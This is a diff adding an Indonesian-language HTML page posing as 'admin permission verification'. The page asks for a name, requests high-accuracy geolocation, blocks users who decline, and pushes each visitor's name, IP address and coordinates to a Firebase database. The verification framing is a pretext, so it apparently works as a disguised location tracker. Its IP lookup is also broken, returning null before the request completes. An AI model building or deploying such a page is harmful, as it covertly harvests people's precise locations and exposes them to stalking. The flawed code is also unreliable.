@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Verifikasi Izin Admin</title>
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+
+  <style>
+    body {
+      background-color: #121212;
+      color: #ffffff;
+      font-family: 'Arial', sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .container {
+      background-color: #1e1e1e;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.6);
+      width: 350px;
+      text-align: center;
+    }
+    h1 {
+      font-size: 24px;
+      margin-bottom: 20px;
+      color: #00ff88;
+    }
+    input {
+      padding: 10px;
+      width: 80%;
+      margin: 10px;
+      border: none;
+      border-radius: 5px;
+      background-color: #333;
+      color: #fff;
+      font-size: 16px;
+    }
+    button {
+      padding: 10px 20px;
+      background-color: #00ff88;
+      color: #000;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 10px;
+      width: 80%;
+    }
+    button:hover {
+      background-color: #00cc66;
+    }
+  </style>
+</head>
+<body>
+  <div class="container" id="formContainer">
+    <h1>Masukkan Nama Anda</h1>
+    <input type="text" id="username" placeholder="Masukkan nama..." />
+    <button onclick="requestLocationPermission()">Verifikasi dan Masuk</button>
+  </div>
+
+  <script>
+    
+    const firebaseConfig = {
+      apiKey: "AIzaSyBVMpOCjY9gdd4UkSa",
+      authDomain: "yanofc-1ecd3.firebaseapp.com",
+      databaseURL: "https://yanofc-1ecd3-default-rtdb.asia-southeast1.firebasedatabase.app",
+      projectId: "yanofc-1ecd3",
+      storageBucket: "yanofc-1ecd3.appspot.com",
+      messagingSenderId: "843043156565",
+      appId: "1:843043156565:web:e00942a837d30e4b4a9adc"
+    };
+
+    
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    
+    if (localStorage.getItem("username")) {
+      window.location.href = "index2.html"; 
+    }
+
+    
+    function requestLocationPermission() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          saveUserData, 
+          redirectToBlockedPage,
+          { enableHighAccuracy: true }
+        );
+      } else {
+        alert("ERROR, AKSES LEWAT CROME");
+      }
+    }
+
+    
+    function saveUserData(position) {
+      const username = document.getElementById("username").value;
+      if (username.trim() === "") {
+        alert("Nama tidak boleh kosong!");
+        return;
+      }
+
+      const userIP = getUserIP(); 
+      if (!userIP) {
+        alert("IP tidak dapat diambil.");
+        return;
+      }
+
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+
+      
+      localStorage.setItem("username", username);
+      localStorage.setItem("userIP", userIP);
+      localStorage.setItem("latitude", latitude);
+      localStorage.setItem("longitude", longitude);
+
+      
+      const userRef = db.ref('users').push();
+      userRef.set({
+        name: username,
+        ip: userIP,
+        latitude: latitude,
+        longitude: longitude,
+        timestamp: Date.now()
+      }, function(error) {
+        if (error) {
+          alert("Gagal menyimpan data!");
+        } else {
+          alert("Data berhasil disimpan!");
+          
+          document.getElementById("formContainer").style.display = "none";
+          setTimeout(() => {
+            window.location.href = "index2.html"; 
+          }, 2000); 
+        }
+      });
+    }
+    function redirectToBlockedPage() {
+      window.location.href = "blocked2.html";
+    }
+    function getUserIP() {
+      let ip = null;
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          ip = data.ip; 
+        })
+        .catch(error => console.log("Error fetching IP:", error));
+      return ip;
+    }
+  </script>
+</body>
+</html>
